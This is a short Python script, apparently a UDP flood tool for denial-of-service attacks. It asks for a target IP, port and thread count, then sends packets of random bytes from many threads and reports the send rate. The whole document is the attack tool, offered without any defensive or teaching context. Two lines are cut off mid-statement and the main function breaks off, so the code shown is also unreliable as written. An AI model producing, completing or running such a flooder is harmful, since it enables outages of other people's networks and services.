import socket
import threading
import random
import time
import os
import sys

ip = input("Target IP: ")
port = int(input("Target Port: "))
threads = int(input("Number of Threads: "))

# Generate 1KB of random bytes
payload = random._urandom(1024)
sent = 0
running = True

def udp_flood():
    global sent, running
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SO>
            sock.sendto(payload, (ip, port))
            sent += 1
        except Exception as e:
            print(f"[!] Error: {e}")
            continue

def monitor():
    global sent, running
    while running:
        time.sleep(1)
        print(f"[+] Packets sent/sec: {sent}")
        sent = 0

def main():
    global running
    try:
        print(f"[+] Starting flood on {ip}:{port} with {th>
        for i in range(threads):
            t = threading.Thread(target=udp_flood)
            t.daemon = True
            t.start()

        monitor_thread = threading.Thread(target=monitor)
        monitor_thread.daemon = True
        monitor_thread.start()

        while True:
            time.sleep(1)
